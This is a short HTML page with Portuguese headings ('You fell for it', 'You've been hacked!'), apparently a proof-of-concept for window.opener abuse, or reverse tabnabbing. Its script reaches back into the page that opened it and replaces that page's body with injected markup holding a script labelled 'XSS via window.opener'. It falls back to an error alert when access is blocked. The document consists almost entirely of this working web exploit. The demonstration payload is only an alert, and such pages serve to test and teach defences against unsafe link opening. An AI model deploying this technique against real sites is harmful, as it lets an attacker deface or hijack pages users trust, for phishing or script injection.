<!DOCTYPE html>
<html>
  <body>
    <h1>Você caiu</h1>
    <script>
      try {
        const payload = `
          <h1>Você foi invadido!</h1>
          <script>
            alert('XSS via window.opener');
          <\/script>
        `;
        window.opener.document.body.innerHTML = payload;
      } catch (e) {
        alert("Falha ao acessar opener: " + e);
      }
    </script>
  </body>
</html>
